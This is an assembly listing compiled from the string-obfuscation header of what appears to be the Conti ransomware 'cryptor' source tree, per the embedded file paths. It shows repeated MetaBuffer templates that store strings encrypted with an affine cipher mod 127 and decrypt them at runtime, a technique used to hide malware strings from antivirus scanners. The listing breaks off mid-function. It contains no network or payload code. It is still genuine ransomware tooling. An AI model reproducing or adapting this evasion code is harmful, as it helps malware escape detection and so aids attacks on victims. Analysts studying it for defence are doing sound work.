; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 67	 sub	 ecx, 103		; 00000067H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 7b	 mov	 BYTE PTR [rcx+1], 123	; 0000007bH
  00007	c6 41 02 67	 mov	 BYTE PTR [rcx+2], 103	; 00000067H
  0000b	c6 41 03 4c	 mov	 BYTE PTR [rcx+3], 76	; 0000004cH
  0000f	c6 41 04 67	 mov	 BYTE PTR [rcx+4], 103	; 00000067H
  00013	c6 41 05 19	 mov	 BYTE PTR [rcx+5], 25
  00017	c6 41 06 67	 mov	 BYTE PTR [rcx+6], 103	; 00000067H
  0001b	c6 41 07 76	 mov	 BYTE PTR [rcx+7], 118	; 00000076H
  0001f	c6 41 08 67	 mov	 BYTE PTR [rcx+8], 103	; 00000067H
  00023	c6 41 09 67	 mov	 BYTE PTR [rcx+9], 103	; 00000067H
  00027	c6 41 0a 67	 mov	 BYTE PTR [rcx+10], 103	; 00000067H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 42	 sub	 ecx, 66			; 00000042H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1e	 mov	 BYTE PTR [rcx+1], 30
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 45	 mov	 BYTE PTR [rcx+3], 69	; 00000045H
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 20	 mov	 BYTE PTR [rcx+5], 32	; 00000020H
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 3a	 mov	 BYTE PTR [rcx+7], 58	; 0000003aH
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 42	 mov	 BYTE PTR [rcx+9], 66	; 00000042H
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 39 00 00 00	 mov	 eax, 57			; 00000039H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 16	 mov	 BYTE PTR [rcx+1], 22
  00007	c6 41 02 39	 mov	 BYTE PTR [rcx+2], 57	; 00000039H
  0000b	c6 41 03 07	 mov	 BYTE PTR [rcx+3], 7
  0000f	c6 41 04 39	 mov	 BYTE PTR [rcx+4], 57	; 00000039H
  00013	c6 41 05 1b	 mov	 BYTE PTR [rcx+5], 27
  00017	c6 41 06 39	 mov	 BYTE PTR [rcx+6], 57	; 00000039H
  0001b	c6 41 07 23	 mov	 BYTE PTR [rcx+7], 35	; 00000023H
  0001f	c6 41 08 39	 mov	 BYTE PTR [rcx+8], 57	; 00000039H
  00023	c6 41 09 39	 mov	 BYTE PTR [rcx+9], 57	; 00000039H
  00027	c6 41 0a 39	 mov	 BYTE PTR [rcx+10], 57	; 00000039H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 22 00 00 00	 mov	 eax, 34			; 00000022H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 66	 mov	 BYTE PTR [rcx+1], 102	; 00000066H
  00007	c6 41 02 22	 mov	 BYTE PTR [rcx+2], 34	; 00000022H
  0000b	c6 41 03 71	 mov	 BYTE PTR [rcx+3], 113	; 00000071H
  0000f	c6 41 04 22	 mov	 BYTE PTR [rcx+4], 34	; 00000022H
  00013	c6 41 05 38	 mov	 BYTE PTR [rcx+5], 56	; 00000038H
  00017	c6 41 06 22	 mov	 BYTE PTR [rcx+6], 34	; 00000022H
  0001b	c6 41 07 26	 mov	 BYTE PTR [rcx+7], 38	; 00000026H
  0001f	c6 41 08 22	 mov	 BYTE PTR [rcx+8], 34	; 00000022H
  00023	c6 41 09 22	 mov	 BYTE PTR [rcx+9], 34	; 00000022H
  00027	c6 41 0a 22	 mov	 BYTE PTR [rcx+10], 34	; 00000022H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 51 00 00 00	 mov	 eax, 81			; 00000051H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
